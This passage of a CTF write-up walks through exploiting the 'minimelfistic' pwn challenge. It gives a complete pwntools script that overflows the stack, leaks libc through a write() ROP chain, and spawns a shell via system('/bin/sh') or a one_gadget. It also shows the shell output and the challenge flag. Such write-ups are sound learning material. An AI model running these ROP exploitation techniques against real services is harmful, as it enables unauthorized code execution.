        <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x7f0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">local_48</span> <span class="o">==</span> <span class="sc">'9'</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">local_20</span> <span class="o">=</span> <span class="s">"Goodbye Santa!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">sVar1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"Goodbye Santa!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">local_20</span><span class="p">,</span><span class="n">sVar1</span><span class="p">);</span>
            <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">local_28</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_00402320</span><span class="p">;</span>
        <span class="n">sVar1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00402320</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">local_28</span><span class="p">,</span><span class="n">sVar1</span><span class="p">);</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The program actually runs in a loop until <code class="language-plaintext highlighter-rouge">(char)local_48 == '9'</code> is <code class="language-plaintext highlighter-rouge">true</code>, which was basically checking if the first character of the user’s input is a <code class="language-plaintext highlighter-rouge">'9'</code>. Before that line, it calls <code class="language-plaintext highlighter-rouge">read()</code> to read <code class="language-plaintext highlighter-rouge">0x7f0</code> or <code class="language-plaintext highlighter-rouge">2032</code> bytes into <code class="language-plaintext highlighter-rouge">local_48</code>. Seeing from the 8-byte variables following <code class="language-plaintext highlighter-rouge">local_48</code>, we can tell that we will able to write enough bytes to write past them and overwrite the return address stored in the stack.</p><p>Lets first run <code class="language-plaintext highlighter-rouge">checksec</code> to see what protections are in place.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>checksec <span class="nt">--file</span><span class="o">=</span>minimelfistic 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73<span class="o">)</span> Symbols       No    0               1               minimelfistic
</pre></table></code></div></div><p>Like the previous pwn challenge, <code class="language-plaintext highlighter-rouge">NX</code> was enabled. However, the same method of solving could not be applied as this time, <code class="language-plaintext highlighter-rouge">puts()</code> was not called. This meant that we had to resort to other methods to leaking the address to <code class="language-plaintext highlighter-rouge">stdout</code>. In the code were a lot of <code class="language-plaintext highlighter-rouge">write()</code> calls and <code class="language-plaintext highlighter-rouge">write()</code> can also be used to write to <code class="language-plaintext highlighter-rouge">stdout</code> with the <code class="language-plaintext highlighter-rouge">fd</code> parameter was set to <code class="language-plaintext highlighter-rouge">1</code>. Therefore, we need to go with <code class="language-plaintext highlighter-rouge">write()</code>.</p><p>Unlike <code class="language-plaintext highlighter-rouge">puts()</code>, <code class="language-plaintext highlighter-rouge">write()</code> takes in 3 parameters, each of which needs to be placed in <code class="language-plaintext highlighter-rouge">RDI</code>, <code class="language-plaintext highlighter-rouge">RSI</code> AND <code class="language-plaintext highlighter-rouge">RDX</code> respectively. Therefore, we will need a ROP gadget to pop a value into each of them.</p><p>Unfortunately, while I am able to find gadgets for <code class="language-plaintext highlighter-rouge">RDI</code> and <code class="language-plaintext highlighter-rouge">RSI</code>, I was not able to find one for <code class="language-plaintext highlighter-rouge">RDX</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> ./minimelfistic | <span class="nb">grep</span> <span class="s2">"pop rdi"</span>
0x0000000000400a43 : pop rdi <span class="p">;</span> ret

<span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> ./minimelfistic | <span class="nb">grep</span> <span class="s2">"pop rsi"</span>
0x0000000000400a41 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret

<span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> ./minimelfistic | <span class="nb">grep</span> <span class="s2">"pop rdx"</span>
</pre></table></code></div></div><p>I researched online for other methods and there was mentions of <code class="language-plaintext highlighter-rouge">ret2csu</code>. But because I was unfamiliar with its concept (or ROP in general, this CTF was the first time I applied the knowledge), I was not confident I could pull it off.</p><p>However, I had a friend that suggested to me that there was a much simpler way, which was to run <code class="language-plaintext highlighter-rouge">sec_alarm()</code>. I was puzzled at first, but it started making sense when I stared at its instructions.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta50.png" alt="" /></p><p>Towards the end, right before the <code class="language-plaintext highlighter-rouge">ret</code> instruction were instructions to setup the registers for the last <code class="language-plaintext highlighter-rouge">write()</code> in <code class="language-plaintext highlighter-rouge">sec_alarm()</code>. This included inserting a value into <code class="language-plaintext highlighter-rouge">RDX</code>! An idea instantly came up to me, which was to use the whole <code class="language-plaintext highlighter-rouge">sec_alarm()</code> as a gadget just to set up <code class="language-plaintext highlighter-rouge">RDX</code>!</p><p>Calling <code class="language-plaintext highlighter-rouge">sec_alarm()</code> will cause the <code class="language-plaintext highlighter-rouge">RDX</code> to contain the length of <code class="language-plaintext highlighter-rouge">"\n[!] Santa returned!\n"</code>, which was sufficient to print an address.</p><p>Lets construct our script.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># libc_file = "/lib/x86_64-linux-gnu/libc.so.6"
</span><span class="n">libc_file</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
<span class="n">elf_file</span> <span class="o">=</span> <span class="s">"./minimelfistic"</span>

<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_file</span><span class="p">)</span>
<span class="n">ELF_LOADED</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_file</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./minimelfistic"</span><span class="p">)</span>
<span class="c1"># p = remote("139.59.180.40", 32606)
</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">ELF_LOADED</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">WRITE_GOT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
<span class="n">WRITE_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>

<span class="n">MAIN_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>

<span class="n">SEC_ALARM_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'sec_alarm'</span><span class="p">]</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rsi'</span><span class="p">,</span> <span class="s">'pop r15'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>

<span class="n">rop1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"9"</span> <span class="o">+</span> <span class="mi">71</span> <span class="o">*</span> <span class="sa">b</span><span class="s">"A"</span>                             <span class="c1"># To reach the stored return address as well as to break out of the loop
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SEC_ALARM_PLT</span><span class="p">)</span>                          <span class="c1"># Set RDX to number of bytes to write() to stdout
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE_GOT</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Set RSI to address containing address of write()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                       <span class="c1"># Set RDI to stdout
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE_PLT</span><span class="p">)</span>                              <span class="c1"># Call write()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN_PLT</span><span class="p">)</span>                               <span class="c1"># Return to main()
</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop1</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"[!] Santa returned!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">received</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">write_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">received</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"write @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_leak</span><span class="p">))</span>

<span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">write_leak</span> <span class="o">-</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">write</span>

<span class="n">BINSH</span> <span class="o">=</span>  <span class="nb">next</span><span class="p">(</span><span class="n">LIBC</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
<span class="n">EXIT</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"exit"</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"/bin/sh @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINSH</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"exit @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">EXIT</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">rop2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"9"</span> <span class="o">+</span> <span class="mi">71</span> <span class="o">*</span> <span class="sa">b</span><span class="s">"A"</span>      <span class="c1"># To reach the stored return address
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>         <span class="c1"># Pop into RDI, which is used as the first argument
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">)</span>           <span class="c1"># Address of "/bin/sh"
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>          <span class="c1"># Address of system()
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXIT</span><span class="p">)</span>            <span class="c1"># Address of exit()
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop2</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Now lets run it locally.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 mini.py 
...
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./minimelfistic'</span>: pid 8218
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Loaded 14 cached gadgets <span class="k">for</span> <span class="s1">'./minimelfistic'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> write @ 0x7f5102965950 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh @ 0x7f5102a0069b 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system @ 0x7f51028c0e10 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">exit</span> @ 0x7f51028b66c0 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Goodbye Santa!

<span class="o">[!]</span> For your safety, the 🚨 will not be deactivated!
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span>,
</pre></table></code></div></div><p>It managed to successfully start a shell! Unfortunately, when running the script against the exposed remote service, the same issue in the previous pwn challenge was also faced when using <code class="language-plaintext highlighter-rouge">system()</code>. Applying the same technique using <code class="language-plaintext highlighter-rouge">OneGadget</code>, I was able to establish a shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>one_gadget ./libc.so.6 
0x4f3d5 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsp+0x40, environ<span class="o">)</span>
constraints:
  rsp &amp; 0xf <span class="o">==</span> 0
  rcx <span class="o">==</span> NULL

0x4f432 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsp+0x40, environ<span class="o">)</span>
constraints:
  <span class="o">[</span>rsp+0x40] <span class="o">==</span> NULL

0x10a41c execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsp+0x70, environ<span class="o">)</span>
constraints:
  <span class="o">[</span>rsp+0x70] <span class="o">==</span> NULL
</pre></table></code></div></div><p>The script is then updated to make use of the gadget found:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c1"># ... Commenting out the previous ropchain
# rop2 = b"9" + 71 * b"A"      # To reach the stored return address
# rop2 += p64(POP_RDI)         # Pop into RDI, which is used as the first argument
# rop2 += p64(BINSH)           # Address of "/bin/sh"
# rop2 += p64(SYSTEM)          # Address of system()
# rop2 += p64(EXIT)            # Address of exit()
# p.sendline(rop2)
</span>
<span class="c1"># Find the gadget
</span><span class="n">ONE_GADGET</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f432</span>

<span class="n">rop3</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"9"</span> <span class="o">+</span> <span class="mi">71</span> <span class="o">*</span> <span class="sa">b</span><span class="s">"A"</span>  <span class="c1"># To reach the stored return address
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE_GADGET</span><span class="p">)</span>  <span class="c1"># Address of the gadget
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">100</span>    <span class="c1"># Ensure that [rsp+0x40] is NULL
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop3</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>If we run the script again, we will be able to establish a shell and get the flag!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 mini.py
...
<span class="o">[</span>+] Opening connection to 139.59.180.40 on port 31165: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Loaded 14 cached gadgets <span class="k">for</span> <span class="s1">'./minimelfistic'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> write @ 0x7f7f101d3210 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh @ 0x7f7f10276e1a 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system @ 0x7f7f10112550 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">exit</span> @ 0x7f7f10106240 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Goodbye Santa!

<span class="o">[!]</span> For your safety, the 🚨 will not be deactivated!
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span>
<span class="nv">$ </span><span class="nb">ls
</span>flag.txt  libc.so.6  minimelfistic
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
HTB<span class="o">{</span>S4nt4_15_n0w_r34dy_t0_g1v3_s0m3_g1ft5<span class="o">}</span>
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{S4nt4_15_n0w_r34dy_t0_g1v3_s0m3_g1ft5}</code></p><p>Script:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># ibc_file = "/lib/x86_64-linux-gnu/libc.so.6"
</span><span class="n">libc_file</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
<span class="n">elf_file</span> <span class="o">=</span> <span class="s">"./minimelfistic"</span>

<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_file</span><span class="p">)</span>
<span class="n">ELF_LOADED</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_file</span><span class="p">)</span>

<span class="c1"># p = process("./minimelfistic")
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"139.59.180.40"</span><span class="p">,</span> <span class="mi">31165</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">ELF_LOADED</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">WRITE_GOT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
<span class="n">WRITE_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>

<span class="n">MAIN_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>

<span class="n">SEC_ALARM_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'sec_alarm'</span><span class="p">]</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rsi'</span><span class="p">,</span> <span class="s">'pop r15'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>

<span class="n">rop1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"9"</span> <span class="o">+</span> <span class="mi">71</span> <span class="o">*</span> <span class="sa">b</span><span class="s">"A"</span>                             <span class="c1"># To reach the stored return address as well as to break out of the loop
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SEC_ALARM_PLT</span><span class="p">)</span>                          <span class="c1"># Set RDX to number of bytes to write() to stdout
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE_GOT</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Set RSI to address containing address of write()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                       <span class="c1"># Set RDI to stdout
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE_PLT</span><span class="p">)</span>                              <span class="c1"># Call write()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN_PLT</span><span class="p">)</span>                               <span class="c1"># Return to main()
</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop1</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"[!] Santa returned!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">received</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">write_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">received</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"write @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_leak</span><span class="p">))</span>

<span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">write_leak</span> <span class="o">-</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">write</span>

<span class="n">BINSH</span> <span class="o">=</span>  <span class="nb">next</span><span class="p">(</span><span class="n">LIBC</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
<span class="n">EXIT</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"exit"</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"/bin/sh @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINSH</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"exit @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">EXIT</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># rop2 = b"9" + 71 * b"A"      # To reach the stored return address
# rop2 += p64(POP_RDI)         # Pop into RDI, which is used as the first argument
# rop2 += p64(BINSH)           # Address of "/bin/sh"
# rop2 += p64(SYSTEM)          # Address of system()
# rop2 += p64(EXIT)            # Address of exit()
# p.sendline(rop2)
</span>
<span class="n">ONE_GADGET</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f432</span>

<span class="n">rop3</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"9"</span> <span class="o">+</span> <span class="mi">71</span> <span class="o">*</span> <span class="sa">b</span><span class="s">"A"</span>  <span class="c1"># To reach the stored return address
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE_GADGET</span><span class="p">)</span>  <span class="c1"># Address of the gadget
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">100</span>    <span class="c1"># Ensure that [rsp+0x40] is NULL
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop3</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h1 id="crypto">Crypto</h1><h2 id="common-mistake-day-1">Common Mistake (Day 1)</h2><blockquote><p>Elves are trying very hard to communicate in perfect secrecy in order to keep Santa’s warehouse. Unfortunately, their lack of knowledge about cryptography leads them to common mistakes.<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">crypto_common_mistake.zip</code></p></blockquote><p>Inside the <code class="language-plaintext highlighter-rouge">crypto_common_mistake.zip</code> is an <code class="language-plaintext highlighter-rouge">encrypted.txt</code> with the following contents:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
